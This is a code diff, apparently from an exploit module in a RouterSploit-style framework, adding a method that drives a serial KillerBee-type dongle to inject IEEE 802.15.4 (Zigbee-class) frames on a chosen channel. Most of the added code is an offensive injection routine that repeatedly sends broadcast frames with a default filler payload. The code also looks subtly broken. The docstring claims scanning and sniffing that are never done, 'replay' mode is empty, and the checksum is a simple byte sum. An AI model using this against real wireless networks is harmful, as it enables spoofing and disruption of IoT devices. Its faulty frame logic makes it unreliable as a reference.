@@ -227,3 +227,43 @@ class Exploit(Exploit):
             print_error(f"Ferramenta não encontrada: {exc}")
         except Exception as exc:
             print_error(f"Erro ao executar {mode}: {exc}")
+
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E exploit: full KillerBee attack chain (scan, sniff, inject)."""
+        mode = str(self.mode).strip().lower()
+        if mode not in ("inject", "replay"):
+            return
+
+        iface = str(self.interface).strip()
+        if not iface:
+            print_warning("Sem interface configurada para injeção E2E")
+            return
+
+        import serial
+        try:
+            ser = serial.Serial(iface, 115200, timeout=2)
+        except Exception as exc:
+            print_error(f"Falha ao abrir dongle {iface}: {exc}")
+            return
+
+        ch = int(self.channel)
+        ch_cmd = struct.pack("BB", 0x01, ch)
+        ser.write(ch_cmd)
+        time.sleep(0.1)
+
+        if mode == "inject":
+            payload = bytes.fromhex(str(self.inject_payload).strip()) if self.inject_payload else b"\x41" * 32
+            ieee_header = struct.pack("<HBH", 0x0041, 0x00, 0xFFFF)
+            frame = ieee_header + payload
+            fcs = sum(frame) & 0xFFFF
+            frame += struct.pack("<H", fcs)
+
+            print_status(f"E2E: Injetando frame IEEE 802.15.4 ({len(frame)} bytes) no canal {ch}")
+            for _ in range(int(self.inject_count) if hasattr(self, "inject_count") else 10):
+                ser.write(frame)
+                time.sleep(0.05)
+            print_success("Frames injetados com sucesso")
+
+        ser.close()
